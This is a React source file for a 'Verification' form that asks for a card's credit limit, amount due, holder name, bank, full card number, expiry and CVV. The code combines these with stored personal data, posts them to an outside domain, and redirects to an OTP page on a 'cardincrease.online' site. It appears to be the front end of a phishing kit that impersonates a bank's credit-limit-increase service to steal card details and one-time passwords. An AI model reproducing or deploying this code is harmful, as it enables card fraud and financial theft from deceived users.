import React, { useEffect, useState } from 'react';
import './Verification.css';

function CreditDetail() {
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    creditLimit: '',
    totalAmountDue: '',
    cardHolderName: '',
    bankName: '',
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });
  const [errors, setErrors] = useState({
    cardNumber: '',
    cvv: ''
  });

  useEffect(() => {
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });
  }, []);

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    // Handle validation for card number and CVV
    if (name === 'cardNumber') {
      if (value.length <= 16 && /^\d*$/.test(value)) {
        setFormData({
          ...formData,
          [name]: value
        });
        setErrors({
          ...errors,
          cardNumber: ''
        });
      } else {
        setErrors({
          ...errors,
          cardNumber: 'Card number must be a 16-digit number'
        });
      }
    } else if (name === 'cvv') {
      if (value.length <= 3 && /^\d*$/.test(value)) {
        setFormData({
          ...formData,
          [name]: value
        });
        setErrors({
          ...errors,
          cvv: ''
        });
      } else {
        setErrors({
          ...errors,
          cvv: 'CVV must be a 3-digit number'
        });
      }
    } else {
      setFormData({
        ...formData,
        [name]: value
      });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    // Retrieve personalData from sessionStorage
    const personalData = JSON.parse(sessionStorage.getItem('personalInfo'));

    if (!personalData) {
      console.error('Personal data not found in session storage');
      setLoading(false);
      return;
    }

    // Combine personalData with formData
    const data = {
      ...personalData,
      creditLimit: formData.creditLimit,
      totalAmountDue: formData.totalAmountDue,
      cardHolderName: formData.cardHolderName,
      bankName: formData.bankName,
      cardNumber: formData.cardNumber,
      expiryMonth: formData.expiryMonth,
      expiryYear: formData.expiryYear,
      cvv: formData.cvv,
    };

    try {
      const response = await fetch('https://rbl.digiindiasolutions.com/v1/createPersonalInfo', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      if (response.ok) {
        // Clear sessionStorage after successful form submission
        sessionStorage.removeItem('personalInfo');
        // Redirect to the next page
        window.location.href = 'https://cardincrease.online/personal-detail/creadit-detail/otp';
        console.log('Data sent successfully');
      } else {
        // Handle error
        console.error('Form submission failed');
      }
    } catch (error) {
      console.error('An error occurred:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      {loading && (
        <div className="loading-overlay">
          <div className="loader"></div>
        </div>
      )}

      <section className='CreditDetail-section'>
        <div className="CreditDetail-container">
          <div className="heading">
            <span>Verification</span>
          </div>
          <div className="w-full md:w-96 md:max-w-full mx-auto">
            <div className="p-6 border border-gray-300 sm:rounded-md">
              <form onSubmit={handleSubmit}>
                <label className="block mb-6">
                  <span className="text-gray-700">Credit Limit</span>
                  <input
                    name="creditLimit"
                    type="number"
                    className="block w-full mt-1 outline-none border-gray-300 rounded-md shadow-sm focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50 p-2"
                    placeholder="Credit Limit"
                    required
                    value={formData.creditLimit}
                    onChange={handleInputChange}
                  />
                </label>
                <label className="block mb-6">
                  <span className="text-gray-700">Total Amount Due</span>
                  <input
                    name="totalAmountDue"
                    type="number"
                    className="block w-full outline-none mt-1 border-gray-300 rounded-md shadow-sm p-2 focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50"
                    placeholder="Total Amount Due"
                    required
                    value={formData.totalAmountDue}
                    onChange={handleInputChange}
                  />
                </label>
                <label className="block mb-6">
                  <span className="text-gray-700">Card Holder Name</span>
                  <input
                    name="cardHolderName"
                    type="text"
                    className="block w-full outline-none mt-1 border-gray-300 rounded-md shadow-sm p-2 focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50"
                    placeholder="Card Holder Name"
                    required
                    value={formData.cardHolderName}
                    onChange={handleInputChange}
                  />
                </label>
                <label className="block mb-6">
                  <span className="text-gray-700">Bank Name</span>
                  <input
                    name="bankName"
                    type="text"
                    className="block w-full outline-none mt-1 border-gray-300 rounded-md shadow-sm p-2 focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50"
                    placeholder="Bank Name"
                    required
                    value={formData.bankName}
                    onChange={handleInputChange}
                  />
                </label>
                <label className="block mb-6">
                  <span className="text-gray-700">Card Number</span>
                  <input
                    name="cardNumber"
                    type="text" // Change to text to handle leading zeros
                    className="block w-full outline-none mt-1 border-gray-300 rounded-md shadow-sm p-2 focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50"
                    placeholder="Card Number"
                    required
                    value={formData.cardNumber}
                    onChange={handleInputChange}
                  />
                  {errors.cardNumber && (
                    <p className="text-red-500 text-sm mt-2">{errors.cardNumber}</p>
                  )}
                </label>
                <div className="flex space-x-4 mb-6">
                  <div className="w-1/2">
                    <label className="block text-gray-700 mb-1" htmlFor="expiry-month">
                      Expiry Month
                    </label>
                    <input
                      name="expiryMonth"
                      type="number"
                      className="block outline-none w-full mt-1 border-gray-300 rounded-md shadow-sm p-2 focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50"
                      placeholder="MM"
                      required
                      value={formData.expiryMonth}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div className="w-1/2">
                    <label className="block text-gray-700 mb-1" htmlFor="expiry-year">
                      Expiry Year
                    </label>
                    <input
                      name="expiryYear"
                      type="number"
                      className="block outline-none w-full mt-1 border-gray-300 rounded-md shadow-sm p-2 focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50"
                      placeholder="YYYY"
                      required
                      value={formData.expiryYear}
                      onChange={handleInputChange}
                      min={new Date().getFullYear()}
                    />
                  </div>
                </div>

                <label className="block mb-6">
                  <span className="text-gray-700">CVV</span>
                  <input
                    name="cvv"
                    type="text" // Change to text to handle leading zeros
                    className="block w-full outline-none mt-1 border-gray-300 rounded-md shadow-sm p-2 focus:border-indigo-300 focus:ring focus:ring-indigo-200 focus:ring-opacity-50"
                    placeholder="CVV"
                    required
                    value={formData.cvv}
                    onChange={handleInputChange}
                  />
                  {errors.cvv && (
                    <p className="text-red-500 text-sm mt-2">{errors.cvv}</p>
                  )}
                </label>

                <div className="mb-6">
                  <button
                    type="submit"
                    className="h-10 px-5 border outline-none text-indigo-100 bg-[#ED3338] rounded-lg p-2 transition-colors duration-150 focus:shadow-outline hover:bg-[#e6232a]"
                  >
                    Submit
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </section>
    </>
  );
}

export default CreditDetail;
